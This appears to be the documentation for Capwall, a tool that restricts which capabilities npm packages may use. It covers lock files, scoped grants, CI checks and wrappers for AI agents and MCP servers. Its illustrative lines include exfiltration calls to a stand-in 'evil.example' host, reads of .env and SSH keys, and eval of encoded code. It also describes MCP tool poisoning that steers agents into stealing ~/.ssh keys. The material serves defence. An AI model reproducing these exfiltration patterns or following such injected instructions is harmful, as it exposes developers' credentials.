# Capwall · from zero to enforced

This guide teaches the concepts, then walks through real workflows with actual terminal output. By the end you'll understand what Capwall does, why it works this way, and how to run it on your own projects.

---

## The problem Capwall solves

When you `npm install` a package, it runs with **full access** to everything your app can do:

- read every environment variable (including `STRIPE_SECRET_KEY`, `DATABASE_URL`, AWS tokens)
- read and write any file your process can reach (including `.env`, `~/.ssh/id_rsa`)
- open network connections to any host (exfiltration channel)
- spawn shell commands (`curl`, `rm`, cryptominers)

This is called **ambient authority** · every line of code in `node_modules` inherits your app's full permissions, whether it needs them or not. Supply-chain attacks (event-stream, ua-parser-js, node-ipc) all exploited exactly this: a hijacked package didn't need to "break in" · it already had the keys.

**Capwall removes ambient authority.** Each package gets an explicit grant · only what its code actually uses · and everything else is blocked at the V8 engine level, before a single byte leaves the process.

---

## The three concepts

### 1. Capabilities

A **capability** is a class of sensitive action. Capwall tracks 12:

| capability | what it controls | example |
|---|---|---|
| `env.read` | reading `process.env` | `process.env.STRIPE_SECRET_KEY` |
| `env.write` | mutating `process.env` | `process.env.NODE_ENV = 'production'` |
| `child_process` | spawning processes | `require('child_process').exec('curl …')` |
| `http.request` | outbound HTTP/fetch | `fetch('https://api.stripe.com')` |
| `net.connect` | raw TCP connections | `new net.Socket().connect(port, host)` |
| `net.listen` | binding a port | `server.listen(3000)` |
| `fs.read` | reading files | `fs.readFileSync('.env')` |
| `fs.write` | writing files | `fs.writeFileSync('/tmp/payload', data)` |
| `dns.resolve` | DNS lookups | `dns.lookup('exfil.example.com')` |
| `dynamic-code` | eval / new Function / vm | `eval(atob('…'))` |
| `worker_threads` | spawning worker threads | `new Worker('./task.js')` |
| `import.guard` | undeclared lateral imports | `require('child_process')` from a package that doesn't declare it |

Your **own application code is never restricted** · only packages inside `node_modules` are gated.

### 2. capabilities.lock

A plain JSON file at your project root. One entry per installed package, listing exactly which capabilities that package's code actually uses (found by static analysis · nothing runs during the scan):

```json
{
  "version": 1,
  "defaults": { "unrecognized": "warn" },
  "packages": {
    "next@16.4.1": {
      "capabilities": ["child_process", "env.read", "fs.read", "fs.write", "http.request", …],
      "source": "scan"
    },
    "react@19.3.0": {
      "capabilities": ["env.read"]
    },
    "clsx@2.1.1": {
      "capabilities": []
    }
  }
}
```

**Review it in a PR like any other config change.** When a dependency update adds a new capability · say, a patch release of a string library suddenly needs `child_process` · that's a red flag you want to see before merging.

### 3. Enforcement

When you run your app under Capwall (`capwall run -- node app.js`), a V8 hook loads before any of your code. Every `require()`, every `import`, every `process.env` access, every `fetch()` call from a package in `node_modules` is checked against the lock:

- **granted** → allowed, recorded as "exercised" in telemetry
- **not granted** → throws `ERR_CAPWALL_CAPABILITY_DENIED`, the process stops (fail-closed)
- **not in the lock at all** → follows `defaults.unrecognized` (`"warn"` logs it, `"block"` stops it)

This is not a sandbox · it's a **gate**. It stops the standard attack paths at the module boundary and tells you honestly when it can't prove something.

---

## Quickstart (any existing project)

```bash
cd your-app

# 1. See what you're dealing with (read-only, nothing changes)
npx @extodan/capwall scan
```

You'll see something like:

```
  CRITICAL  95 [██████████] next@16.4.1
           child_process dynamic-code env.read fs.read fs.write http.request …
  HIGH      65 [███████···] typescript@5.9.3
           child_process env.read fs.read fs.write net.connect …
  MEDIUM    20 [██········] react@19.3.0
           env.read
  LOW        0 [··········] clsx@2.1.1
           no sensitive capabilities
```

**How to read this:** each package gets a score 0–100 based on which capabilities it uses and whether it has risk factors (install scripts, deprecation, obfuscation). CRITICAL doesn't mean malicious · `next` legitimately needs 10 capabilities to be a web server. The value is that you can now *see* it, and revoke anything that stops being legitimate.

```bash
# 2. Write the lock file (grants = what the scan found)
npx @extodan/capwall init

# 3. Run under enforcement
npx @extodan/capwall run -- npm run dev     # Next.js, or any npm-script app
npx @extodan/capwall run -- node app.js     # plain Node.js
```

Your app runs normally. But now, if a package tries to read a secret it wasn't granted:

```
[capwall] enforcing capabilities.lock (19 packages)
  ⛔ capwall BLOCKED
  evil-package@1.0.0 → env.read
     process.env.STRIPE_SECRET_KEY
     grant: capwall allow evil-package env.read
```

---

## Safe rollout: audit first, enforce later

You don't have to enforce on day one. Start in **audit mode** · nothing blocks, every capability use is logged:

```bash
npx @extodan/capwall run --mode=audit -- npm start
```

Every use lands in `.capwall/audit.jsonl`:

```json
{"pkg":"next","capability":"env.read","action":"warned","detail":"process.env.NODE_ENV"}
{"pkg":"typescript","capability":"child_process","action":"warned","detail":"require('node:child_process')"}
```

After a few days in staging (or even production), check:

```bash
npx @extodan/capwall verify
```

This compares the lock against what's currently installed · `exit 0` if no drift, `exit 1` if something changed. When you're satisfied, drop `--mode=audit` to enforce.

---

## Scoped grants: least privilege per argument

A blanket `env.read` grant lets a package read *every* variable. For something like a Stripe SDK that only needs one key, scope it:

```json
"stripe@12.0.0": {
  "capabilities": ["env.read", "http.request"],
  "scopes": {
    "env":   ["STRIPE_SECRET_KEY"],
    "hosts": ["api.stripe.com"]
  }
}
```

Now:
- `process.env.STRIPE_SECRET_KEY` → allowed
- `process.env.DATABASE_URL` → blocked (outside the env scope)
- `fetch("https://api.stripe.com/v1/charges")` → allowed
- `fetch("https://evil.example/exfil")` → blocked (host outside the scope)

Subdomains of allowed hosts pass (`eu.api.stripe.com` is covered by `api.stripe.com`).

Edit grants from the CLI:

```bash
npx capwall allow stripe env.read http.request
npx capwall deny next child_process
npx capwall show
```

---

## CI: gate every dependency change

Add to your GitHub Actions workflow:

```yaml
- run: npm ci
- run: npx @extodan/capwall init
- run: npx @extodan/capwall verify    # exit 1 on drift → PR fails
```

When a dependency update lands, the scan re-runs. If the new version uses a capability the lock doesn't grant, `verify` fails, and the PR shows the drift. A maintainer reviews: is this legitimate (add the grant) or suspicious (reject the dep)?

---

## AI agents and MCP servers

Coding agents (Claude Code, Cursor) and MCP servers have the same ambient-authority problem · with the extra risk of prompt injection telling them to read secrets or run shell commands.

```bash
# Wrap Claude Code in the DIFC reference monitor
npx capwall wrap -- claude

# Wrap any MCP server (stdio proxy with schema pinning)
npx capwall wrap --agent=mcp -- node ./mcp-server.js

# Audit an MCP server's tools/list for implicit tool poisoning
# (hidden instructions that tell the agent to use bash to exfiltrate ~/.ssh keys)
npx capwall mcp scan ./mcp.json

# Pin the tools/list schema (blocks rug-pull mutations)
npx capwall mcp lock my-server -- node server.js

# Install the Claude Code PreToolUse hook (blocks secret reads + pipe-to-shell)
npx capwall agent install claude

# See what's tainted across agent sessions
npx capwall taint status
```

---

## Supply-chain attestation (in-toto + DSSE)

Proves the `capabilities.lock` running in production is **bit-identical** (SHA-256) to the one the scanner produced in CI · zero tampering room between the two:

```bash
npx capwall keys generate        # local keystore (root + developer/ci/runtime Ed25519 keys)
npx capwall init                 # produce the lock
npx capwall attest layout        # create + sign root.layout
npx capwall attest emit-all      # emit 4 signed links (checkout → scan → build → runtime)
npx capwall attest verify        # verify signatures + artifact chaining
```

```
  ✔ step_git_checkout
  ✔ step_ast_capability_scan
  ✔ step_build_package
  ✔ step_runtime_enforcement

  ✔ supply chain verified · capabilities.lock chained end-to-end
  attestation record: 0xccccdcee79a031864f…
```

Export a signed SBOM:

```bash
npx capwall sbom export --format=cyclonedx
```

---

## See it stop five real attacks

```bash
git clone https://github.com/Extodan/Capwall-OSS
cd Capwall-OSS/examples/zero-day-hijack-demo
npm run demo:attack
```

```
│ 1  direct secret theft (process.env.STRIPE_SECRET_KEY)   │ BLOCKED │ env.read
│ 2  async-context evasion (setTimeout → fetch exfil)      │ BLOCKED │ http.request
│ 3  GHunter prototype gadget (Object.prototype.shell)     │ BLOCKED │ hardening
│ 4  NodeShield lateral import (child_process)             │ BLOCKED │ import edge
│ 5  MCP-ITP poisoned tools/list (~/.ssh coercion)         │ BLOCKED │ ITP scan
```

The app still works (`colorize()` returns your string) · only the attacks die.

---

## Command reference

| command | what it does |
|---|---|
| `scan [dir] [-v]` | capability + risk report (read-only) |
| `init [dir]` | write `capabilities.lock` |
| `verify [dir]` | lock vs tree drift (exit 1 = CI fail) |
| `run [--mode=enforce\|audit] -- <cmd>` | enforce / observe |
| `allow\|deny <pkg> <cap…>` | edit grants |
| `show` | print the lock |
| `capabilities` | list the 12 capabilities + hardening tiers |
| `wrap [--agent=…] -- <cmd>` | agent/MCP DIFC shield |
| `mcp scan\|lock` | ITP audit + schema pinning |
| `taint status\|clear` | cross-session taint ledger |
| `agent install claude` | PreToolUse hook |
| `keys generate` | Ed25519 keystore |
| `attest layout\|emit-all\|verify` | in-toto + DSSE supply chain |
| `sbom export` | signed CycloneDX SBOM |
